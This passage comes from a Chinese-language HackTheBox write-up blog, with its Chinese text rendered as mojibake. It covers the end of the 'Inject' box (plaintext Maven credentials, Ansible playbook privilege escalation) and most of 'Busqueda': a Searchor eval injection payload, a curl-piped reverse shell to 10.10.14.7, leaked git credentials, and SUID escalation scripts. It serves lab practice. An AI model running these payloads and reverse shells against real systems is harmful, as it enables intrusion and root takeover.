<pre class="line-numbers language-none"><code class="language-none">frank@inject:/$ find / -group frank -type f 2&gt;/dev/null | grep -v "proc"
find / -group frank -type f 2&gt;/dev/null | grep -v "proc"
/tmp/XvFlf
/tmp/CmMlc
/tmp/JYiHo.b64
/tmp/hsperfdata_frank/824
/tmp/YGqfV.b64
/tmp/KpLRF.b64
/tmp/gotRCEbutCANTrevSHELL.aaaaaa
/tmp/CkFZS
/tmp/shell.sh
/home/frank/.bashrc
/home/frank/.m2/settings.xml
/home/frank/.cache/motd.legal-displayed
/home/frank/.profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>/home/frank/.m2/settings.xml</code>çœ‹åˆ°<code>phil</code>è´¦æˆ·</p>
<pre class="line-numbers language-none"><code class="language-none">frank@inject:/$ cat /home/frank/.m2/settings.xml
cat /home/frank/.m2/settings.xml
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
  &lt;servers&gt;
    &lt;server&gt;
      &lt;id&gt;Inject&lt;/id&gt;
      &lt;username&gt;phil&lt;/username&gt;
      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;
      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
      &lt;configuration&gt;&lt;/configuration&gt;
    &lt;/server&gt;
  &lt;/servers&gt;
&lt;/settings&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">phil
DocPhillovestoInject123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æ‰§è¡Œ<code>su phil</code>åˆ‡æ¢åˆ°<code>phil</code>è´¦æˆ·ï¼ˆè¾“å…¥å¯†ç å›è½¦ä¹‹åå°±æ˜¯philç”¨æˆ·äº†ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">frank@inject:/$ su phil
su phil
Password: DocPhillovestoInject123
id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
pwd
/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸‹è½½<code>linpeas.sh</code>åˆ°æœ¬åœ°ï¼š<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p>
<p>æœ¬åœ°å¼€å¯httpæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>phil</code>ç”¨æˆ·çª—å£æ‰§è¡Œ<code>wget http://10.10.16.9/linpeas.sh</code>ï¼Œä»æœ¬åœ°ä¼ è¾“<code>linpeas.sh</code>åˆ°é¶æœº</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403181628295.png"></p>
<p>æ·»åŠ å¯æ‰§è¡Œæƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">chmod 777 linpeas.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="äº”ã€Ansible-Playbookææƒ"><a href="#äº”ã€Ansible-Playbookææƒ" class="headerlink" title="äº”ã€Ansible Playbookææƒ"></a>äº”ã€Ansible Playbookææƒ</h2><p>æ‰§è¡Œ<code>./linpeas.sh</code>ï¼Œçœ‹åˆ°å¦‚å›¾è‡ªåŠ¨ä»»åŠ¡<code>playbook_1.yml</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403185432389.png"></p>
<p>æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>
<pre class="line-numbers language-none"><code class="language-none">ls -la /opt/automation/tasks/playbook_1.yml
-rw-r--r-- 1 root root 150 Apr  3 11:36 /opt/automation/tasks/playbook_1.yml
cat /opt/automation/tasks/playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>googleæœç´¢ï¼Œæ˜¯ansible playbookï¼Œç”±äºé¶æœºshellç¯å¢ƒç¼–è¾‘æ–‡ä»¶ä¸æ–¹ä¾¿ï¼Œæœ¬åœ°ç¼–è¾‘<code>getshell.yml</code>ï¼Œå†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">- hosts: localhost
  tasks:
    - name: getshell
      command: chmod u+s /bin/bash
      become: true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å›åˆ°é¶æœºï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†æ–‡ä»¶ä»æœ¬åœ°ä¼ è¾“åˆ°é¶æœº<code>/opt/automation/tasks/</code>ç›®å½•ä¸‹ï¼ˆè®°å¾—æœ¬åœ°å¼€httpæœåŠ¡ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">cd /opt/automation/tasks/
wget http://10.10.16.9/getshell.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç¨ç­‰ç‰‡åˆ»ï¼Œè‡ªåŠ¨ä»»åŠ¡æ‰§è¡Œåï¼ŒæŸ¥çœ‹<code>/bin/bash</code>å·²è®¾ç½®suidï¼Œæ‰§è¡Œ<code>bash -p</code>ï¼ŒæˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403201728343.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403202130316.png" style="zoom:80%;">

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/qq_58869808/article/details/129505388">https://blog.csdn.net/qq_58869808/article/details/129505388</a></p>
<p><a href="https://www.0le.cn/archives/55.html">https://www.0le.cn/archives/55.html</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>Spring Cloud Function</tag>
        <tag>SpELæ³¨å…¥</tag>
        <tag>Ansible Playbookææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Busqueda</title>
    <url>/posts/d91931aa.html</url>
    <content><![CDATA[<h1 id="HTB-Busqueda"><a href="#HTB-Busqueda" class="headerlink" title="HTB-Busqueda"></a>HTB-Busqueda</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ä¿¡æ¯æ”¶é›†å‘ç°å‘½ä»¤æ³¨å…¥ï¼›</p>
<p>2.å‘½ä»¤æ³¨å…¥åå¼¹shellè·å–svcç”¨æˆ·æƒé™ï¼›</p>
<p>3.Gitä¿¡æ¯æ³„éœ²å¯†ç ï¼›</p>
<p>4.<code>sudo -l</code>å‘ç°å¯suidææƒï¼›</p>
<p>5.suidææƒè·å–rootæƒé™ã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>Nmapï¼Œå…ˆæ‰«ç«¯å£ï¼Œåæ‰«æœåŠ¡</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410160635734.png">

<p>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ã€80ï¼ˆhttpï¼‰ï¼›åŸŸåï¼š<code>searcher.htb</code></p>
<p>æ·»åŠ åŸŸåè§£æè®°å½•åˆ°æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.208 searcher.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨è®¿é—®<code>http://searcher.htb/</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410102604709.png"></p>
<p>å¤§è‡´æ„æ€ï¼Œæ˜¯ä¸€ä¸ªé›†æˆäº†å¤šæœç´¢å¼•æ“çš„æœç´¢å¹³å°ã€‚</p>
<p>ç¬¬ä¸€ä¸ªæ¡†ï¼ˆSelect your engineï¼‰æ˜¯ä¸ªä¸‹æ‹‰æ¡†ï¼Œå¯é€‰æ‹©å„ç§æœç´¢å¼•æ“ï¼›</p>
<p>ç¬¬äºŒä¸ªæ¡†ï¼ˆWhat do you want to search forï¼‰æ˜¯æƒ³è¦æœç´¢çš„å†…å®¹ï¼›</p>
<p>æ­¤å¤„å°è¯•æœç´¢å¼•æ“é€‰æ‹©Appleï¼Œæœç´¢å†…å®¹ä¸º123</p>
<p>ä¸‹é¢çš„é€‰é¡¹<code>Auto redirect</code>ï¼Œä¸å‹¾é€‰ï¼Œæœç´¢æ—¶ä¼šè¿”å›å¦‚ä¸‹æ ¼å¼çš„é“¾æ¥ï¼›å‹¾é€‰ï¼Œä¼šé‡å®šå‘åˆ°æŒ‡å®šæœç´¢å¼•æ“</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410103511821.png"></p>
<p>å¦å¤–é¡µé¢åº•éƒ¨ï¼Œå¯çœ‹åˆ°<code>Flask</code>æ¡†æ¶å’Œ<code>Searchor 2.4.0</code>ï¼Œæ‰€ä»¥åç«¯æ˜¯Python</p>
<h2 id="ä¸‰ã€å‘½ä»¤æ³¨å…¥"><a href="#ä¸‰ã€å‘½ä»¤æ³¨å…¥" class="headerlink" title="ä¸‰ã€å‘½ä»¤æ³¨å…¥"></a>ä¸‰ã€å‘½ä»¤æ³¨å…¥</h2><p>æœç´¢çš„åŒæ—¶ç”¨BurpæŠ“åŒ…ï¼Œæµ‹è¯•å‘ç°<code>query</code>å­—æ®µå¯èƒ½æœ‰æ³¨å…¥ï¼Œå¦‚ä¸‹ä¸¤å¼ å›¾ã€‚Sqlmapå°è¯•postæ³¨å…¥ï¼Œæ— æœ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410171555402.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410171637361.png"></p>
<p>çœ‹äº†ä¸€ä¸‹Githubä¸ŠSearchorçš„ä»‹ç»ï¼š<a href="https://github.com/ArjunSharda/Searchor">https://github.com/ArjunSharda/Searchor</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411111122155.png"></p>
<p>æ ¹æ®CLIï¼ˆCommand-Line Interfaceï¼‰å‘½ä»¤ï¼Œæ¨æµ‹ä¸€ä¸‹ï¼Œpostå‚æ•°ä¼ åˆ°CLIæ—¶ï¼Œæ‹¼æ¥å¤§æ¦‚å¦‚ä¸‹ï¼ˆæ­¤å¤„ç”¨<code>123'</code>å’Œ<code>123"</code>æµ‹è¯•ï¼ŒåŒå¼•å·æ—¶å“åº”æ­£å¸¸ï¼Œå•å¼•å·å“åº”å¼‚å¸¸ï¼Œæ‰€ä»¥å‚æ•°å€¼åº”è¯¥è¢«å•å¼•å·åŒ…è£¹ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">searchor engine 'query' --copy
ä¾‹ï¼šsearchor Apple '123' --copy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æƒ³åŠæ³•åœ¨queryå‚æ•°ä½æ³¨å…¥æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤</p>
<p>å‚è€ƒï¼š<a href="https://realpython.com/python-eval-function/">https://realpython.com/python-eval-function/</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411115221617.png"></p>
<p>compile()å‡½æ•°è¯­æ³•ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">compile() ç”¨äºå°†æºä»£ç ç¼–è¯‘ä¸ºä»£ç å¯¹è±¡æˆ–ASTæ¨¡å—å¯¹è±¡ã€‚å¯ä»¥æ ¹æ®æä¾›çš„æ¨¡å¼ä½¿ç”¨exec()æˆ–eval()å‡½æ•°æ‰§è¡Œè¿”å›çš„ä»£ç å¯¹è±¡ï¼Œä»¥æ„é€ ä»£ç å¯¹è±¡ã€‚
è¯­æ³•ï¼šcompile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1)

source: å¿…é€‰é¡¹ï¼Œè¡¨ç¤ºè¦ç¼–è¯‘çš„æºä»£ç ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ–‡ä»¶æˆ–ASTï¼ˆAbstract Syntax Treeï¼‰å¯¹è±¡ã€‚
filename: å¯é€‰é¡¹ï¼Œè¡¨ç¤ºç¼–è¯‘ä»£ç çš„æ–‡ä»¶åï¼Œå¦‚æœä¸æ˜¯ä»æ–‡ä»¶ä¸­ç¼–è¯‘ä»£ç ï¼Œä¼ å…¥ â€œ&lt;string&gt;â€ å³å¯ã€‚
mode: å¯é€‰é¡¹ï¼Œè¡¨ç¤ºç¼–è¯‘ä»£ç ç±»å‹ï¼Œå¯ä»¥å–å€¼ä¸º â€œexecâ€ï¼ˆç¼–è¯‘æ•´ä¸ªä»£ç ï¼‰ï¼Œâ€œevalâ€ï¼ˆç¼–è¯‘å•ä¸ªè¡¨è¾¾å¼ï¼‰æˆ–â€œsingleâ€ï¼ˆç¼–è¯‘å•ä¸ªè¯­å¥ï¼‰ã€‚
flags: å¯é€‰é¡¹ï¼Œä¼ å…¥å˜é‡æˆ–ä½æ©ç ï¼Œç”¨äºæ§åˆ¶ç¼–è¯‘å™¨çš„è¡Œä¸ºæˆ–ç‰¹æ€§ã€‚
dont_inherit: å¯é€‰é¡¹ï¼Œè¡¨ç¤ºæ˜¯å¦ç»§æ‰¿sys.flagså’Œsys.__optimizations__æ¨¡å—ä¸­ç›¸å…³é€‰é¡¹çš„å€¼ã€‚
optimize: å¯é€‰é¡¹ï¼ŒæŒ‡å®šç¼–è¯‘å™¨çš„ä¼˜åŒ–çº§åˆ«ï¼Œè‹¥è®¾ç½®ä¸º-1ï¼Œè¡¨ç¤ºä½¿ç”¨é»˜è®¤ä¼˜åŒ–çº§åˆ«ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è‡ªå·±æœ¬åœ°ç”¨pythonæµ‹è¯•ä¸€ä¸‹ï¼Œå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">test = compile("import os\nos.system('id')","&lt;String&gt;","exec")
eval(test)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410174447442.png"></p>
<p>å¦‚å›¾å¯ä»¥æˆåŠŸæ‰§è¡Œ<code>id</code>å‘½ä»¤</p>
<p>é‚£å°±å°è¯•ä¿®æ”¹è¯·æ±‚åŒ…ï¼Œä¼ é€’å¦‚ä¸‹queryå€¼ï¼Œæ‰§è¡Œ<code>id</code>å‘½ä»¤ï¼ˆå‰é¢<code>1'</code>å’Œåé¢<code>'</code>ç”¨äºé—­åˆï¼Œä¸­é—´æœ‰ç©ºæ ¼çš„åœ°æ–¹ç”¨åŠ å·è¿æ¥ã€‚å®é™…æµ‹è¯•æœ‰æ²¡æœ‰åŠ å·éƒ½å¯ä»¥ï¼Œä½†å‰åä¸¤ä¸ª<code>%2b</code>éœ€è¦åŠ ï¼Œä¸”ç”¨ç©ºæ ¼å’Œ%20æ›¿ä»£è¡Œä¸é€šï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('id')",'&lt;String&gt;','exec'))%2b'

ä¼ åˆ°CLIåï¼š
searchor Apple '1' eval(compile("import os\nos.system('id')",'&lt;String&gt;','exec')) '' --copy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410173619288.png"></p>
<p>å¯çœ‹åˆ°æœ‰ä¸‰ä¸ªåœ°æ–¹å±•ç¤ºäº†å›æ˜¾ï¼šå“åº”å¤´éƒ¨<code>Location</code>ã€å“åº”å†…å®¹<code>&lt;a&gt;</code>æ ‡ç­¾<code>href</code>å€¼ã€å“åº”å†…å®¹<code>&lt;a&gt;</code>æ ‡ç­¾æ–‡æœ¬ã€‚ä¸”å½“å‰ç”¨æˆ·æ˜¯<code>svc</code></p>
<p>å†ç”¨å¦‚ä¸‹è¯­å¥æ‰§è¡Œ<code>ls</code>å‘½ä»¤æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹å†…å®¹</p>
<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('ls')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410185732026.png"></p>
<p>æœ‰<code>app.py</code>å’Œ<code>templates</code></p>
<p>ç„¶åæ‰§è¡Œ<code>cat app.py</code>å‘½ä»¤æŸ¥çœ‹<code>app.py</code>å†…å®¹</p>
<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('cat+app.py')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410200023303.png"></p>
<p>URLè§£ç å¾—å¦‚ä¸‹ä»£ç ï¼Œä»ä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°postä¼ å‚çš„é€»è¾‘</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
<span class="token keyword">from</span> searchor <span class="token keyword">import</span> Engine
<span class="token keyword">import</span> subprocess

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        engine <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'engine'</span><span class="token punctuation">)</span>
        query <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span>
        auto_redirect <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auto_redirect'</span><span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> engine <span class="token keyword">in</span> Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            arg_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'searchor'</span><span class="token punctuation">,</span> <span class="token string">'search'</span><span class="token punctuation">,</span> engine<span class="token punctuation">,</span> query<span class="token punctuation">]</span>
            r <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>arg_list<span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
            url <span class="token operator">=</span> r<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> auto_redirect <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url<span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> url

        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Invalid engine!"</span><span class="token punctuation">)</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Something went wrong!"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ¥ä¸‹æ¥å°è¯•åå¼¹shell</p>
<p>æ”»å‡»æœºå¼€å¯ncç›‘å¬å’ŒhttpæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898
python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æ”»å‡»æœºæ–°å»ºä¸€ä¸ªåå¼¹shellæ–‡ä»¶<code>rev_shell.txt</code>ï¼Œå†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Burpä¿®æ”¹è¯·æ±‚åŒ…queryå‚æ•°å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('curl+10.10.14.7/rev_shell.txt|bash')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å‘é€è¯·æ±‚åŒ…ï¼ŒæˆåŠŸåå¼¹shellï¼Œè·å–svcç”¨æˆ·æƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410200356098.png"></p>
<h2 id="å››ã€Gitä¿¡æ¯æ³„éœ²"><a href="#å››ã€Gitä¿¡æ¯æ³„éœ²" class="headerlink" title="å››ã€Gitä¿¡æ¯æ³„éœ²"></a>å››ã€Gitä¿¡æ¯æ³„éœ²</h2><p>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶ï¼Œçœ‹åˆ°æœ‰<code>.git</code>ï¼Œå°è¯•git-dumpå’ŒGithackä¸‹è½½å¤±è´¥ï¼Œåªèƒ½ç¡¬çœ‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410202411535.png"></p>
<p>çœ‹åˆ°<code>config</code>æ–‡ä»¶é‡Œæœ‰ç”¨æˆ·åå¯†ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410202439506.png"></p>
<pre class="line-numbers language-none"><code class="language-none">cody:jh1usoih2bkjaspwe92<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>PSï¼šåé¢çš„<code>gitea.searcher.htb</code>æ˜¯ä¸ªå­åŸŸï¼ŒåŠ è¿›hostsæ–‡ä»¶çœ‹äº†ä¸€çœ¼ï¼Œæ˜¯ä¸ªç±»ä¼¼gitä»“åº“çš„ä¸œè¥¿ï¼Œæœ‰ä¸¤ä¸ªç”¨æˆ·<code>cody</code>å’Œ<code>administrator</code>ï¼Œä¼°è®¡ä¹Ÿæ˜¯ä¸€æ¡è·¯çº¿ï¼Œä½†æ²¡è¿‡å¤šå°è¯•</p>
<h2 id="äº”ã€SUIDææƒ"><a href="#äº”ã€SUIDææƒ" class="headerlink" title="äº”ã€SUIDææƒ"></a>äº”ã€SUIDææƒ</h2><p>åœ¨svcç”¨æˆ·å°è¯•æ‰§è¡Œ<code>sudo -l</code>ï¼Œå‘ç°æç¤ºéœ€è¦<code>-S</code>å‚æ•°è¾“å…¥å¯†ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410203854475.png"></p>
<p>æ‰§è¡Œ<code>sudo -l -S</code>ï¼Œå°è¯•å¯†ç ï¼Œæ˜¯ä¸Šé¢codyçš„å¯†ç ï¼ˆPSï¼šåœ¨HackTheBoxé‡è§å¥½å‡ æ¬¡è¿™ç§å¼ å† ææˆ´çš„äº‹â€¦ï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410203820884.png"></p>
<p>å¯çœ‹åˆ°æœ‰ä¸€æ¡å‘½ä»¤å¯ä»¥ä»¥rootèº«ä»½æ‰§è¡Œï¼Œsudoæ‰§è¡Œè¯¥å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/python3 /opt/scripts/system-checkup.py *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410204703295.png"></p>
<p>æç¤ºä¸‰ä¸ªç”¨æ³•ï¼Œå‰ä¸¤ä¸ªæ˜¯æŸ¥çœ‹dockerå®¹å™¨çš„ç›¸å…³ä¿¡æ¯ï¼Œç”¨å¤„ä¸å¤§ï¼Œç¬¬ä¸‰ä¸ªå°è¯•ä¼šæŠ¥é”™ï¼Œå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205015580.png"></p>
<p>æƒ³çœ‹ä¸€ä¸‹<code>/opt/scripts/system-checkup.py</code>ï¼Œæ²¡æƒé™ï¼Œå°±ç”¨<code>find</code>å‘½ä»¤æ¨¡ç³ŠæŸ¥æ‰¾<code>full-checkup</code>ï¼Œå‘ç°æœ‰<code>/opt/scripts/full-checkup.sh</code>ï¼Œä½†svcç”¨æˆ·æ²¡æœ‰å¯å†™æƒé™æ²¡æ³•æ›´æ”¹ï¼Œé‚£å°±å°è¯•åœ¨å½“å‰ç›®å½•<code>/home/svc</code>æ–°å»ºä¸€ä¸ªåŒåæ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411151914512.png"></p>
<p>é¶æœºshellç¯å¢ƒä¸æ–¹ä¾¿ç¼–è¾‘æ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨æ”»å‡»æœºåˆ›å»º<code>full-checkup.sh</code>ï¼Œå†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">#!/bin/bash
chmod +s /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç„¶ååœ¨é¶æœºç”¨<code>wget</code>æŠŠ<code>full-checkup.sh</code>ä¼ è¿‡æ¥ï¼Œå¹¶æ·»åŠ å¯æ‰§è¡Œæƒé™ï¼ˆæ³¨æ„éœ€åœ¨<code>/home/svc</code>ç›®å½•ä¸‹æ“ä½œï¼Œåˆ«çš„ç›®å½•æ— å¯å†™æƒé™ï¼‰</p>
